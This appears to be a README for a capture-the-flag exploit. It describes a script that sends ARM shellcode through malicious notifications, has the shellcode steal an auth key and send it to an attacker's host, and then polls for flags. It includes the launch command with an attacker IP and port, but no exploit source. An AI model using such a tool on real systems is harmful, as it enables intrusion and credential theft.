Exploit sends shell to device and execute it by using vulnerability. Shell steals auth key and sends its over the network to the remote attacker's host.
You can see shell's source assembler code in shell.s. To compile shell you need GCC ARM toolchain and then launch ./compile_shell.sh, this step is not 
required because shell is already compiler. Do this if you want to modificate the shell.

To run exploit launch ./sploit.py. This script expects as command line arguments IP address of attacker's host and port to open:
./sploit.py 10.60.0.6 9999
Script reads shell.bin, authenticates on server, builds and sends malicious notifications, which contains some message, shell, ip address and port.

After it receives stolen auth key and then enters infinite loop where it asks server for a new notifications, some of them have to contain flags
